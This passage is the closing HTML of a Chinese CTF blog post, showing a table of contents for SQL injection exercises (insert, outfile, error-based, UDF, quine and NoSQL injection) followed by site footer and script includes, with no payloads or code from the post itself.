href="#231-232%EF%BC%88%E4%B8%80%E4%B8%AA%E6%98%AF%E5%AD%97%E7%AC%A6%E4%B8%B2%EF%BC%89"><span class="nav-text">231-232（一个是字符串）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#233%EF%BC%88%E9%83%BD%E6%98%AF%E5%AD%97%E7%AC%A6%EF%BC%89"><span class="nav-text">233（都是字符）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#234%EF%BC%88%E6%97%A0%E5%8D%95%E5%BC%95%E5%8F%B7%EF%BC%8C%E4%BD%BF%E7%94%A8-%E9%80%83%E9%80%B8%EF%BC%89"><span class="nav-text">234（无单引号，使用  \  逃逸）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#235%EF%BC%88%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5%EF%BC%8Cinformation-schema-%E8%A2%AB%E8%BF%87%E6%BB%A4%EF%BC%89"><span class="nav-text">235（无列名注入，information_schema 被过滤）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#236%EF%BC%88%E6%B2%A1%E5%95%A5%E9%87%8D%E7%82%B9%EF%BC%8C%E6%A3%80%E6%B5%8B%E8%BF%94%E5%9B%9E%E5%80%BC%EF%BC%89"><span class="nav-text">236（没啥重点，检测返回值）</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#insert"><span class="nav-text">insert</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#237"><span class="nav-text">237</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#payload-1%EF%BC%88%E6%B2%A1%E8%BF%87%E6%BB%A4%E5%8D%95%E5%BC%95%E5%8F%B7%EF%BC%8C%E7%AE%80%E5%8D%95%E9%97%AD%E5%90%88%EF%BC%89"><span class="nav-text">payload 1（没过滤单引号，简单闭合）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#payload-2%EF%BC%88%E5%81%87%E5%A6%82%E8%BF%87%E6%BB%A4%E4%BA%86%E5%8D%95%E5%BC%95%E5%8F%B7%EF%BC%8C-%E9%80%83%E9%80%B8%EF%BC%89"><span class="nav-text">payload 2（假如过滤了单引号，\ 逃逸）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#238%EF%BC%88%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC%EF%BC%89"><span class="nav-text">238（过滤空格）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#239%EF%BC%88%E7%A9%BA%E6%A0%BC%E5%92%8Cinformation-schema%EF%BC%89"><span class="nav-text">239（空格和information_schema）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8D%8A%E5%9C%BApayload"><span class="nav-text">半场payload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#script"><span class="nav-text">script</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#bp"><span class="nav-text">bp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#240%EF%BC%88%E5%86%8D%E5%8A%A0%E4%B8%8A%E8%BF%87%E6%BB%A4mysql%E5%AD%97%E6%AE%B5%EF%BC%89"><span class="nav-text">240（再加上过滤mysql字段）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-10"><span class="nav-text">exp</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#delete"><span class="nav-text">delete</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#241"><span class="nav-text">241</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#into-outfile"><span class="nav-text">into outfile</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#242"><span class="nav-text">242</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#payload-5"><span class="nav-text">payload</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#243-%E5%A4%9A%E8%BF%87%E6%BB%A4%E4%BA%86php%EF%BC%8C%E6%96%B0%E5%A7%BF%E5%8A%BF"><span class="nav-text">243(多过滤了php，新姿势)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#payload-6"><span class="nav-text">payload</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-text">报错注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0"><span class="nav-text">知识学习</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#244"><span class="nav-text">244</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%99%E6%B3%951-%E2%80%93updatexml"><span class="nav-text">写法1 –updatexml</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%99%E6%B3%952-%E2%80%93extractvalue"><span class="nav-text">写法2 –extractvalue</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#245"><span class="nav-text">245</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#246%EF%BC%88updatexml%E5%92%8Cextractvalue-%E8%A2%ABban%EF%BC%89"><span class="nav-text">246（updatexml和extractvalue 被ban）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#floor%E6%B3%A8%E5%85%A5"><span class="nav-text">floor注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#247%EF%BC%88floor%E4%B9%9F%E6%97%A0%E4%BA%86%EF%BC%89"><span class="nav-text">247（floor也无了）</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#udf-%E6%B3%A8%E5%85%A5"><span class="nav-text">udf 注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0-1"><span class="nav-text">知识学习</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#248"><span class="nav-text">248</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-11"><span class="nav-text">exp</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#quine%E6%B3%A8%E5%85%A5"><span class="nav-text">quine注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Nosql%E6%B3%A8%E5%85%A5"><span class="nav-text">Nosql注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#web249-253"><span class="nav-text">web249 -253</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BB%83%E9%A2%98%E8%A1%A5%E5%85%85"><span class="nav-text">练题补充</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E9%80%97%E5%8F%B7"><span class="nav-text">绕过逗号</span></a></li></ol></li></ol>

    </div>
</div>
        </div>
    
</div>



                

            </div>

            

        </div>

        <div class="main-content-footer">
            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
    <div class="info-container py-3 text-center">
        
        <div class="text-center">
            &copy;
            
              <span>2024</span>
              -
            
            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Ko1sh1</a>
            
                
                <p class="post-count space-x-0.5">
                    <span>
                        共 14 篇文章
                    </span>
                    
                        <span>
                            共 128.2k 字
                        </span>
                    
                </p>
            
        </div>
        
        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
            <span class="lg:block text-sm">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a> 驱动</span>
            <span class="text-sm lg:block">主题&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.6.1</a></span>
        </div>
        
        
            <div>
                博客已运行 <span class="odometer" id="runtime_days" ></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒
            </div>
        
        
            <script data-swup-reload-script>
                try {
                    function odometer_init() {
                    const elements = document.querySelectorAll('.odometer');
                    elements.forEach(el => {
                        new Odometer({
                            el,
                            format: '( ddd).dd',
                            duration: 200
                        });
                    });
                    }
                    odometer_init();
                } catch (error) {}
            </script>
        
        
            
                
        
                
        
        
    </div>  
</footer>
        </div>
    </div>

    
        <div class="post-tools">
            <div class="post-tools-container">
    <ul class="article-tools-list">
        <!-- TOC aside toggle -->
        
            <li class="right-bottom-tools page-aside-toggle">
                <i class="fa-regular fa-outdent"></i>
            </li>
        

        <!-- go comment -->
        
            <li class="go-comment">
                <i class="fa-regular fa-comments"></i>
            </li>
        
    </ul>
</div>

        </div>
    

    <div class="right-side-tools-container">
        <div class="side-tools-container">
    <ul class="hidden-tools-list">
        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
            <i class="fa-regular fa-magnifying-glass-plus"></i>
        </li>

        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
            <i class="fa-regular fa-magnifying-glass-minus"></i>
        </li>

        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
            <i class="fa-regular fa-moon"></i>
        </li>

        <!-- rss -->
        

        

        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
            <i class="fa-regular fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="visible-tools-list">
        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
            <i class="fa-regular fa-cog fa-spin"></i>
        </li>
        
            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
                <i class="arrow-up fas fa-arrow-up"></i>
                <span class="percent"></span>
            </li>
        
        
    </ul>
</div>

    </div>

    <div class="image-viewer-container">
    <img src="">
</div>


    
        <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
          <span class="search-input-field-pre">
            <i class="fa-solid fa-keyboard"></i>
          </span>
            <div class="search-input-container">
                <input autocomplete="off"
                       autocorrect="off"
                       autocapitalize="off"
                       placeholder="搜索..."
                       spellcheck="false"
                       type="search"
                       class="search-input"
                >
            </div>
            <span class="popup-btn-close">
                <i class="fa-solid fa-times"></i>
            </span>
        </div>
        <div id="search-result">
            <div id="no-result">
                <i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
            </div>
        </div>
    </div>
</div>

    

</main>


    
<script src="/js/libs/Swup.min.js"></script>

<script src="/js/libs/SwupSlideTheme.min.js"></script>

<script src="/js/libs/SwupScriptsPlugin.min.js"></script>

<script src="/js/libs/SwupProgressPlugin.min.js"></script>

<script src="/js/libs/SwupScrollPlugin.min.js"></script>

<script src="/js/libs/SwupPreloadPlugin.min.js"></script>

<script>
    const swup = new Swup({
        plugins: [
            new SwupScriptsPlugin({
                optin: true,
            }),
            new SwupProgressPlugin(),
            new SwupScrollPlugin({
                offset: 80,
            }),
            new SwupSlideTheme({
                mainElement: ".main-content-body",
            }),
            new SwupPreloadPlugin(),
        ],
        containers: ["#swup"],
    });
</script>







<script src="/js/tools/imageViewer.js" type="module"></script>

<script src="/js/utils.js" type="module"></script>

<script src="/js/main.js" type="module"></script>

<script src="/js/layouts/navbarShrink.js" type="module"></script>

<script src="/js/tools/scrollTopBottom.js" type="module"></script>

<script src="/js/tools/lightDarkSwitch.js" type="module"></script>

<script src="/js/layouts/categoryList.js" type="module"></script>



    
<script src="/js/tools/localSearch.js" type="module"></script>




    
<script src="/js/tools/codeBlock.js" type="module"></script>




    
<script src="/js/layouts/lazyload.js" type="module"></script>




    
<script src="/js/tools/runtime.js"></script>

    
<script src="/js/libs/odometer.min.js"></script>

    
<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">




  
<script src="/js/libs/Typed.min.js"></script>

  
<script src="/js/plugins/typed.js" type="module"></script>








    
<script src="/js/libs/anime.min.js"></script>



<div class="post-scripts" data-swup-reload-script>
    
        
<script src="/js/tools/tocToggle.js" type="module"></script>

<script src="/js/layouts/toc.js" type="module"></script>

<script src="/js/plugins/tabs.js" type="module"></script>

    
</div>


    <div id="aplayer"></div>

<script src="/js/libs/APlayer.min.js"></script>


<script src="/js/plugins/aplayer.js"></script>


</body>
</html>
